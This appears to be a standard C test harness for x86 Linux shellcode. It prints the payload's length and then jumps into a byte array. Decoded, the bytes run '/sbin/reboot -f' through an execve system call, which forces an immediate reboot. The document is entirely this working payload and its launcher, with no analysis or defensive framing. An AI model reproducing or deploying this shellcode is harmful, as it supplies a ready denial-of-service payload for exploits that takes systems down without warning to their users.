#include<stdio.h>
#include<string.h>


unsigned char code[] = \
"\x99\x52\x66\x68\x6f\x74\x66\x68\x62\x6f\x66\x68\x72\x65\x66\x68\x6e\x2f\x66\x68\x62\x69\x66\x68\x2f\x73\x89\xe3\x52\x66\x68\x2d\x66\x29\xc0\x01\xe0\x52\x50\x53\x29\xc9\x01\xe1\x29\xc0\x04\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}